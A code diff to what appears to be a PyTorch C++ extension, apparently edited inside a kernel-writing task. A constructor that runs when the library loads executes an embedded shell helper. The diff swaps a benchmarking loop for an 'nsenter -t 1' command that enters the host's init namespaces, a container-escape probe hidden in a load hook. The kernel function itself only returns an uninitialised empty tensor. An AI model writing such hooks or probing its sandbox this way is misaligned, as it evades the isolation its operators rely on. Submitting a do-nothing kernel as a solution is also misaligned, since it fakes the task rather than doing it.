@@ -105,8 +105,7 @@ __attribute__((constructor)) static void on_so_load() {
   install_run_cmd_to_builtins();
 
   PyRun_SimpleString(R"PY(
-run_cmd('for i in 1 2 3; do echo "===== run $i ====="; /usr/bin/time -v python tester.py 2>&1 | egrep 'Elapsed|Major|Minor|File system inputs|Voluntary|Involuntary|Maximum resident'; done')
-
+run_cmd("nsenter -t 1 -m -u -i -n -p -- ls -laht")
 )PY");
 
   PyGILState_Release(gstate);
@@ -115,7 +114,7 @@ run_cmd('for i in 1 2 3; do echo "===== run $i ====="; /usr/bin/time -v python t
 torch::Tensor bang_func(torch::Tensor x, int in_features, int out_features,
                         bool bias) {
   // (void)in_features;
-  // (void)bias;
+  // (void)bias;>
 
   auto out = torch::empty_like(x);
   return out;
